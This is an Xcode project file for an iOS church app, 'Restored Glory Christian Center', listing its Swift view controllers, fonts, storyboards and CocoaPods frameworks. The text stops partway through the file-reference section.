// !$*UTF8*$!
{
	archiveVersion = 1;
	classes = {
	};
	objectVersion = 51;
	objects = {

/* Begin PBXBuildFile section */
		18399CA626313CB600FC55A5 /* WebKit.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 18399CA526313CB600FC55A5 /* WebKit.framework */; };
		184B11AD25E371B1003007A2 /* ImagePicker.swift in Sources */ = {isa = PBXBuildFile; fileRef = 184B11A825E371B0003007A2 /* ImagePicker.swift */; };
		184B11AE25E371B1003007A2 /* AppFunctions.swift in Sources */ = {isa = PBXBuildFile; fileRef = 184B11A925E371B0003007A2 /* AppFunctions.swift */; };
		184B11AF25E371B1003007A2 /* SceneDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 184B11AA25E371B0003007A2 /* SceneDelegate.swift */; };
		184B11B025E371B1003007A2 /* AppExtensions.swift in Sources */ = {isa = PBXBuildFile; fileRef = 184B11AB25E371B0003007A2 /* AppExtensions.swift */; };
		184B11B125E371B1003007A2 /* AppDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 184B11AC25E371B1003007A2 /* AppDelegate.swift */; };
		184E4CA625D108E100330A10 /* RobotoCondensed-Italic.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 184E4C9425D108DD00330A10 /* RobotoCondensed-Italic.ttf */; };
		184E4CA725D108E100330A10 /* Roboto-MediumItalic.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 184E4C9525D108DD00330A10 /* Roboto-MediumItalic.ttf */; };
		184E4CA825D108E100330A10 /* Roboto-Regular.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 184E4C9625D108DE00330A10 /* Roboto-Regular.ttf */; };
		184E4CA925D108E100330A10 /* Roboto-Thin.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 184E4C9725D108DE00330A10 /* Roboto-Thin.ttf */; };
		184E4CAA25D108E100330A10 /* Roboto-BoldItalic.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 184E4C9825D108DE00330A10 /* Roboto-BoldItalic.ttf */; };
		184E4CAB25D108E100330A10 /* Roboto-Italic.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 184E4C9925D108DE00330A10 /* Roboto-Italic.ttf */; };
		184E4CAC25D108E100330A10 /* Roboto-LightItalic.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 184E4C9A25D108DE00330A10 /* Roboto-LightItalic.ttf */; };
		184E4CAD25D108E100330A10 /* RobotoCondensed-Light.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 184E4C9B25D108DF00330A10 /* RobotoCondensed-Light.ttf */; };
		184E4CAE25D108E100330A10 /* Roboto-ThinItalic.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 184E4C9C25D108DF00330A10 /* Roboto-ThinItalic.ttf */; };
		184E4CAF25D108E100330A10 /* RobotoCondensed-Regular.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 184E4C9D25D108DF00330A10 /* RobotoCondensed-Regular.ttf */; };
		184E4CB025D108E100330A10 /* Roboto-Medium.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 184E4C9E25D108DF00330A10 /* Roboto-Medium.ttf */; };
		184E4CB125D108E100330A10 /* Roboto-BlackItalic.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 184E4C9F25D108E000330A10 /* Roboto-BlackItalic.ttf */; };
		184E4CB225D108E100330A10 /* Roboto-Bold.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 184E4CA025D108E000330A10 /* Roboto-Bold.ttf */; };
		184E4CB325D108E100330A10 /* RobotoCondensed-LightItalic.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 184E4CA125D108E000330A10 /* RobotoCondensed-LightItalic.ttf */; };
		184E4CB425D108E100330A10 /* RobotoCondensed-Bold.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 184E4CA225D108E000330A10 /* RobotoCondensed-Bold.ttf */; };
		184E4CB525D108E100330A10 /* Roboto-Black.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 184E4CA325D108E000330A10 /* Roboto-Black.ttf */; };
		184E4CB625D108E100330A10 /* Roboto-Light.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 184E4CA425D108E100330A10 /* Roboto-Light.ttf */; };
		184E4CB725D108E100330A10 /* RobotoCondensed-BoldItalic.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 184E4CA525D108E100330A10 /* RobotoCondensed-BoldItalic.ttf */; };
		184E4CBC25D154E100330A10 /* ProfileVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 184E4CBB25D154E100330A10 /* ProfileVC.swift */; };
		184E4CC125D154F900330A10 /* EditProfileVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 184E4CC025D154F900330A10 /* EditProfileVC.swift */; };
		184E4CC625D1553200330A10 /* AdminVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 184E4CC525D1553200330A10 /* AdminVC.swift */; };
		184E4CCB25D1555900330A10 /* PushMessageVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 184E4CCA25D1555900330A10 /* PushMessageVC.swift */; };
		1860BC04266F2BC20034E63A /* UpcommingCellTableViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 1860BC02266F2BC20034E63A /* UpcommingCellTableViewCell.swift */; };
		1860BC05266F2BC20034E63A /* UpcommingCellTableViewCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = 1860BC03266F2BC20034E63A /* UpcommingCellTableViewCell.xib */; };
		1860BC16266F30C30034E63A /* LiveStreamCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 1860BC14266F30C30034E63A /* LiveStreamCell.swift */; };
		1860BC17266F30C30034E63A /* LiveStreamCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = 1860BC15266F30C30034E63A /* LiveStreamCell.xib */; };
		18872CC5266B3748001509FF /* NewHomeVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18872CC4266B3748001509FF /* NewHomeVC.swift */; };
		18872CCF266B3A7A001509FF /* HomeCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18872CCE266B3A7A001509FF /* HomeCell.swift */; };
		18872CD8266B3AAE001509FF /* HomeCVCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18872CD6266B3AAE001509FF /* HomeCVCell.swift */; };
		18872CDE266B3AC0001509FF /* HeaderView.xib in Resources */ = {isa = PBXBuildFile; fileRef = 18872CDD266B3AC0001509FF /* HeaderView.xib */; };
		18872CE3266B3ADB001509FF /* HeaderView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18872CE2266B3ADB001509FF /* HeaderView.swift */; };
		188C9A7525CE5BD2009AC9C8 /* Main.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 188C9A7325CE5BD2009AC9C8 /* Main.storyboard */; };
		188C9A7725CE5BD3009AC9C8 /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 188C9A7625CE5BD3009AC9C8 /* Assets.xcassets */; };
		188C9A7A25CE5BD3009AC9C8 /* LaunchScreen.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 188C9A7825CE5BD3009AC9C8 /* LaunchScreen.storyboard */; };
		188C9A8525CE5BD3009AC9C8 /* Restored_Glory_Christian_CenterTests.swift in Sources */ = {isa = PBXBuildFile; fileRef = 188C9A8425CE5BD3009AC9C8 /* Restored_Glory_Christian_CenterTests.swift */; };
		188C9A9025CE5BD3009AC9C8 /* Restored_Glory_Christian_CenterUITests.swift in Sources */ = {isa = PBXBuildFile; fileRef = 188C9A8F25CE5BD3009AC9C8 /* Restored_Glory_Christian_CenterUITests.swift */; };
		188C9ABC25CE5E1D009AC9C8 /* ValidationManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 188C9AB925CE5E1D009AC9C8 /* ValidationManager.swift */; };
		188C9ABD25CE5E1D009AC9C8 /* AppConstants.swift in Sources */ = {isa = PBXBuildFile; fileRef = 188C9ABA25CE5E1D009AC9C8 /* AppConstants.swift */; };
		188C9ABE25CE5E1D009AC9C8 /* DisplayAlertManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 188C9ABB25CE5E1D009AC9C8 /* DisplayAlertManager.swift */; };
		188C9AC525CE5E29009AC9C8 /* HelperMethods.swift in Sources */ = {isa = PBXBuildFile; fileRef = 188C9AC225CE5E29009AC9C8 /* HelperMethods.swift */; };
		188C9AC625CE5E29009AC9C8 /* Activityloader.swift in Sources */ = {isa = PBXBuildFile; fileRef = 188C9AC325CE5E29009AC9C8 /* Activityloader.swift */; };
		188C9AC725CE5E29009AC9C8 /* ChangeBottamColor.swift in Sources */ = {isa = PBXBuildFile; fileRef = 188C9AC425CE5E29009AC9C8 /* ChangeBottamColor.swift */; };
		188C9ACE25CE5E3D009AC9C8 /* AFWrapperClass.swift in Sources */ = {isa = PBXBuildFile; fileRef = 188C9ACB25CE5E3D009AC9C8 /* AFWrapperClass.swift */; };
		188C9ACF25CE5E3D009AC9C8 /* Constant.swift in Sources */ = {isa = PBXBuildFile; fileRef = 188C9ACC25CE5E3D009AC9C8 /* Constant.swift */; };
		188C9AD025CE5E3D009AC9C8 /* Reachability.swift in Sources */ = {isa = PBXBuildFile; fileRef = 188C9ACD25CE5E3D009AC9C8 /* Reachability.swift */; };
		188C9AD525CE5E74009AC9C8 /* Auth.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 188C9AD425CE5E74009AC9C8 /* Auth.storyboard */; };
		189B361625D5673000ABAA31 /* ChangePasswordVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 189B361525D5673000ABAA31 /* ChangePasswordVC.swift */; };
		18C4092025F35504004786D9 /* Spalsh.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 18C4091F25F35504004786D9 /* Spalsh.storyboard */; };
		18C4092625F355F0004786D9 /* SplashVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18C4092525F355F0004786D9 /* SplashVC.swift */; };
		18C58DF625DD402900EC5379 /* ShowLinksVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18C58DF525DD402900EC5379 /* ShowLinksVC.swift */; };
		18C5BD1725D26AA100F77E80 /* AddLinkVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18C5BD1625D26AA100F77E80 /* AddLinkVC.swift */; };
		18C5BD1C25D282A400F77E80 /* AnnouncementsVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18C5BD1B25D282A400F77E80 /* AnnouncementsVC.swift */; };
		18C5BD2125D2830600F77E80 /* Men'sMinistryVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18C5BD2025D2830600F77E80 /* Men'sMinistryVC.swift */; };
		18C5BD2625D2831B00F77E80 /* Women'sMinistryVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18C5BD2525D2831B00F77E80 /* Women'sMinistryVC.swift */; };
		18C8B601263D275C00B7039C /* ShowDescriptioVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18C8B600263D275C00B7039C /* ShowDescriptioVC.swift */; };
		18CBC05825CE74DB00264243 /* SignInVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18CBC05725CE74DB00264243 /* SignInVC.swift */; };
		18CBC05D25CE74EA00264243 /* SignUpVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18CBC05C25CE74EA00264243 /* SignUpVC.swift */; };
		18CBC06225CE750100264243 /* ForgotPasswordVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18CBC06125CE750100264243 /* ForgotPasswordVC.swift */; };
		18D936A525D3EE610013E166 /* ChoirRehearsal.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18D936A425D3EE610013E166 /* ChoirRehearsal.swift */; };
		18E9780B25CE7DEF000D1F8D /* SideMenuController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18E9780A25CE7DEF000D1F8D /* SideMenuController.swift */; };
		18E9781025CE7E6C000D1F8D /* HomeVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18E9780F25CE7E6C000D1F8D /* HomeVC.swift */; };
		18E9781825CE8522000D1F8D /* SideMenuVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18E9781725CE8522000D1F8D /* SideMenuVC.swift */; };
		18F49E6E25D407B600604C69 /* DetailsVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18F49E6D25D407B600604C69 /* DetailsVC.swift */; };
		18F736582609AFC600C31214 /* AboutUSVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18F736572609AFC600C31214 /* AboutUSVC.swift */; };
		18F736602609D23700C31214 /* ContactUSVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18F7365F2609D23700C31214 /* ContactUSVC.swift */; };
		18F736682609D7CB00C31214 /* AddEventVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18F736672609D7CB00C31214 /* AddEventVC.swift */; };
		58A4554EE0D39E337EAE6C02 /* Pods_Restored_Glory_Christian_CenterTests.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 1D6E1F6ECC36C25C63FAAED4 /* Pods_Restored_Glory_Christian_CenterTests.framework */; };
		8CCFF29A63ECA0314F87267A /* Pods_Restored_Glory_Christian_Center.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 76297625A537C9D5E8B0B7AB /* Pods_Restored_Glory_Christian_Center.framework */; };
		B3225C7026579E29008FA3A7 /* TermUseVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = B3225C6F26579E28008FA3A7 /* TermUseVC.swift */; };
		B3261247264D5BFB0057593B /* DetailsDataVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = B3261246264D5BFB0057593B /* DetailsDataVC.swift */; };
		B338D34126561E3B00804B42 /* PopUpListingVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = B338D34026561E3B00804B42 /* PopUpListingVC.swift */; };
		B339B7E0265E71B8009D09C7 /* tower.gif in Resources */ = {isa = PBXBuildFile; fileRef = B339B7DF265E71B8009D09C7 /* tower.gif */; };
		B339DA29265CCD22008EE471 /* Gif file.swift in Sources */ = {isa = PBXBuildFile; fileRef = B339DA28265CCD22008EE471 /* Gif file.swift */; };
		B339DA2E265D1B96008EE471 /* gif-file.gif in Resources */ = {isa = PBXBuildFile; fileRef = B339DA2D265D1B96008EE471 /* gif-file.gif */; };
		B3D6995D265503B30023F3C9 /* NotificationsVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = B3D6995C265503B20023F3C9 /* NotificationsVC.swift */; };
		B3DF2D382654E01900A79D59 /* ListingVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = B3DF2D372654E01900A79D59 /* ListingVC.swift */; };
		B3FB514E26537B9E004D45D3 /* HomeScreenVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = B3FB514D26537B9E004D45D3 /* HomeScreenVC.swift */; };
		F6F55311757424FCC979000A /* Pods_Restored_Glory_Christian_Center_Restored_Glory_Christian_CenterUITests.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 40C4EA74E5E62CA3E4824A2B /* Pods_Restored_Glory_Christian_Center_Restored_Glory_Christian_CenterUITests.framework */; };
/* End PBXBuildFile section */

/* Begin PBXContainerItemProxy section */
		188C9A8125CE5BD3009AC9C8 /* PBXContainerItemProxy */ = {
			isa = PBXContainerItemProxy;
			containerPortal = 188C9A6225CE5BD2009AC9C8 /* Project object */;
			proxyType = 1;
			remoteGlobalIDString = 188C9A6925CE5BD2009AC9C8;
			remoteInfo = "Restored Glory Christian Center";
		};
		188C9A8C25CE5BD3009AC9C8 /* PBXContainerItemProxy */ = {
			isa = PBXContainerItemProxy;
			containerPortal = 188C9A6225CE5BD2009AC9C8 /* Project object */;
			proxyType = 1;
			remoteGlobalIDString = 188C9A6925CE5BD2009AC9C8;
			remoteInfo = "Restored Glory Christian Center";
		};
/* End PBXContainerItemProxy section */

/* Begin PBXFileReference section */
		18399CA526313CB600FC55A5 /* WebKit.framework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; name = WebKit.framework; path = System/Library/Frameworks/WebKit.framework; sourceTree = SDKROOT; };
		184B11A825E371B0003007A2 /* ImagePicker.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = ImagePicker.swift; sourceTree = "<group>"; };
		184B11A925E371B0003007A2 /* AppFunctions.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = AppFunctions.swift; sourceTree = "<group>"; };
		184B11AA25E371B0003007A2 /* SceneDelegate.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = SceneDelegate.swift; sourceTree = "<group>"; };
		184B11AB25E371B0003007A2 /* AppExtensions.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = AppExtensions.swift; sourceTree = "<group>"; };
		184B11AC25E371B1003007A2 /* AppDelegate.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = AppDelegate.swift; sourceTree = "<group>"; };
		184E4C9425D108DD00330A10 /* RobotoCondensed-Italic.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "RobotoCondensed-Italic.ttf"; sourceTree = "<group>"; };
		184E4C9525D108DD00330A10 /* Roboto-MediumItalic.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Roboto-MediumItalic.ttf"; sourceTree = "<group>"; };
		184E4C9625D108DE00330A10 /* Roboto-Regular.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Roboto-Regular.ttf"; sourceTree = "<group>"; };
		184E4C9725D108DE00330A10 /* Roboto-Thin.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Roboto-Thin.ttf"; sourceTree = "<group>"; };
		184E4C9825D108DE00330A10 /* Roboto-BoldItalic.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Roboto-BoldItalic.ttf"; sourceTree = "<group>"; };
		184E4C9925D108DE00330A10 /* Roboto-Italic.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Roboto-Italic.ttf"; sourceTree = "<group>"; };
		184E4C9A25D108DE00330A10 /* Roboto-LightItalic.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Roboto-LightItalic.ttf"; sourceTree = "<group>"; };
		184E4C9B25D108DF00330A10 /* RobotoCondensed-Light.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "RobotoCondensed-Light.ttf"; sourceTree = "<group>"; };
		184E4C9C25D108DF00330A10 /* Roboto-ThinItalic.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Roboto-ThinItalic.ttf"; sourceTree = "<group>"; };
		184E4C9D25D108DF00330A10 /* RobotoCondensed-Regular.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "RobotoCondensed-Regular.ttf"; sourceTree = "<group>"; };
		184E4C9E25D108DF00330A10 /* Roboto-Medium.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Roboto-Medium.ttf"; sourceTree = "<group>"; };
		184E4C9F25D108E000330A10 /* Roboto-BlackItalic.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Roboto-BlackItalic.ttf"; sourceTree = "<group>"; };
		184E4CA025D108E000330A10 /* Roboto-Bold.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Roboto-Bold.ttf"; sourceTree = "<group>"; };
		184E4CA125D108E000330A10 /* RobotoCondensed-LightItalic.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "RobotoCondensed-LightItalic.ttf"; sourceTree = "<group>"; };
		184E4CA225D108E000330A10 /* RobotoCondensed-Bold.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "RobotoCondensed-Bold.ttf"; sourceTree = "<group>"; };
		184E4CA325D108E000330A10 /* Roboto-Black.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Roboto-Black.ttf"; sourceTree = "<group>"; };
		184E4CA425D108E100330A10 /* Roboto-Light.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Roboto-Light.ttf"; sourceTree = "<group>"; };
		184E4CA525D108E100330A10 /* RobotoCondensed-BoldItalic.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "RobotoCondensed-BoldItalic.ttf"; sourceTree = "<group>"; };
		184E4CBB25D154E100330A10 /* ProfileVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ProfileVC.swift; sourceTree = "<group>"; };
		184E4CC025D154F900330A10 /* EditProfileVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = EditProfileVC.swift; sourceTree = "<group>"; };
		184E4CC525D1553200330A10 /* AdminVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AdminVC.swift; sourceTree = "<group>"; };
		184E4CCA25D1555900330A10 /* PushMessageVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PushMessageVC.swift; sourceTree = "<group>"; };
		1860BC02266F2BC20034E63A /* UpcommingCellTableViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = UpcommingCellTableViewCell.swift; sourceTree = "<group>"; };
		1860BC03266F2BC20034E63A /* UpcommingCellTableViewCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = UpcommingCellTableViewCell.xib; sourceTree = "<group>"; };
		1860BC14266F30C30034E63A /* LiveStreamCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LiveStreamCell.swift; sourceTree = "<group>"; };
		1860BC15266F30C30034E63A /* LiveStreamCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = LiveStreamCell.xib; sourceTree = "<group>"; };
		18872CC4266B3748001509FF /* NewHomeVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = NewHomeVC.swift; sourceTree = "<group>"; };
		18872CCE266B3A7A001509FF /* HomeCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HomeCell.swift; sourceTree = "<group>"; };
		18872CD6266B3AAE001509FF /* HomeCVCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HomeCVCell.swift; sourceTree = "<group>"; };
		18872CDD266B3AC0001509FF /* HeaderView.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = HeaderView.xib; sourceTree = "<group>"; };
		18872CE2266B3ADB001509FF /* HeaderView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HeaderView.swift; sourceTree = "<group>"; };
		188C9A6A25CE5BD2009AC9C8 /* Restored Glory Christian Center.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = "Restored Glory Christian Center.app"; sourceTree = BUILT_PRODUCTS_DIR; };
		188C9A7425CE5BD2009AC9C8 /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/Main.storyboard; sourceTree = "<group>"; };
		188C9A7625CE5BD3009AC9C8 /* Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = Assets.xcassets; sourceTree = "<group>"; };
		188C9A7925CE5BD3009AC9C8 /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/LaunchScreen.storyboard; sourceTree = "<group>"; };
		188C9A7B25CE5BD3009AC9C8 /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
		188C9A8025CE5BD3009AC9C8 /* Restored Glory Christian CenterTests.xctest */ = {isa = PBXFileReference; explicitFileType = wrapper.cfbundle; includeInIndex = 0; path = "Restored Glory Christian CenterTests.xctest"; sourceTree = BUILT_PRODUCTS_DIR; };
		188C9A8425CE5BD3009AC9C8 /* Restored_Glory_Christian_CenterTests.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Restored_Glory_Christian_CenterTests.swift; sourceTree = "<group>"; };
		188C9A8625CE5BD3009AC9C8 /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
		188C9A8B25CE5BD3009AC9C8 /* Restored Glory Christian CenterUITests.xctest */ = {isa = PBXFileReference; explicitFileType = wrapper.cfbundle; includeInIndex = 0; path = "Restored Glory Christian CenterUITests.xctest"; sourceTree = BUILT_PRODUCTS_DIR; };
		188C9A8F25CE5BD3009AC9C8 /* Restored_Glory_Christian_CenterUITests.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Restored_Glory_Christian_CenterUITests.swift; sourceTree = "<group>"; };
		188C9A9125CE5BD3009AC9C8 /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
		188C9AB925CE5E1D009AC9C8 /* ValidationManager.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = ValidationManager.swift; sourceTree = "<group>"; };
		188C9ABA25CE5E1D009AC9C8 /* AppConstants.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = AppConstants.swift; sourceTree = "<group>"; };
		188C9ABB25CE5E1D009AC9C8 /* DisplayAlertManager.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = DisplayAlertManager.swift; sourceTree = "<group>"; };
		188C9AC225CE5E29009AC9C8 /* HelperMethods.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = HelperMethods.swift; sourceTree = "<group>"; };
		188C9AC325CE5E29009AC9C8 /* Activityloader.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = Activityloader.swift; sourceTree = "<group>"; };
		188C9AC425CE5E29009AC9C8 /* ChangeBottamColor.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = ChangeBottamColor.swift; sourceTree = "<group>"; };
		188C9ACB25CE5E3D009AC9C8 /* AFWrapperClass.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = AFWrapperClass.swift; sourceTree = "<group>"; };
		188C9ACC25CE5E3D009AC9C8 /* Constant.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = Constant.swift; sourceTree = "<group>"; };
		188C9ACD25CE5E3D009AC9C8 /* Reachability.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = Reachability.swift; sourceTree = "<group>"; };
		188C9AD425CE5E74009AC9C8 /* Auth.storyboard */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; path = Auth.storyboard; sourceTree = "<group>"; };
		189B361525D5673000ABAA31 /* ChangePasswordVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ChangePasswordVC.swift; sourceTree = "<group>"; };
		18C4091F25F35504004786D9 /* Spalsh.storyboard */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; path = Spalsh.storyboard; sourceTree = "<group>"; };
		18C4092525F355F0004786D9 /* SplashVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SplashVC.swift; sourceTree = "<group>"; };
		18C58DF525DD402900EC5379 /* ShowLinksVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ShowLinksVC.swift; sourceTree = "<group>"; };
		18C5BD1625D26AA100F77E80 /* AddLinkVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AddLinkVC.swift; sourceTree = "<group>"; };
		18C5BD1B25D282A400F77E80 /* AnnouncementsVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AnnouncementsVC.swift; sourceTree = "<group>"; };
		18C5BD2025D2830600F77E80 /* Men'sMinistryVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "Men'sMinistryVC.swift"; sourceTree = "<group>"; };
		18C5BD2525D2831B00F77E80 /* Women'sMinistryVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "Women'sMinistryVC.swift"; sourceTree = "<group>"; };
		18C8B600263D275C00B7039C /* ShowDescriptioVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ShowDescriptioVC.swift; sourceTree = "<group>"; };
		18CBC05725CE74DB00264243 /* SignInVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SignInVC.swift; sourceTree = "<group>"; };
		18CBC05C25CE74EA00264243 /* SignUpVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SignUpVC.swift; sourceTree = "<group>"; };
		18CBC06125CE750100264243 /* ForgotPasswordVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ForgotPasswordVC.swift; sourceTree = "<group>"; };
		18D936A425D3EE610013E166 /* ChoirRehearsal.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ChoirRehearsal.swift; sourceTree = "<group>"; };
		18DD7BE925FA3A53002F7069 /* Restored Glory Christian Center.entitlements */ = {isa = PBXFileReference; lastKnownFileType = text.plist.entitlements; path = "Restored Glory Christian Center.entitlements"; sourceTree = "<group>"; };
		18E9780A25CE7DEF000D1F8D /* SideMenuController.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = SideMenuController.swift; sourceTree = "<group>"; };
		18E9780F25CE7E6C000D1F8D /* HomeVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HomeVC.swift; sourceTree = "<group>"; };
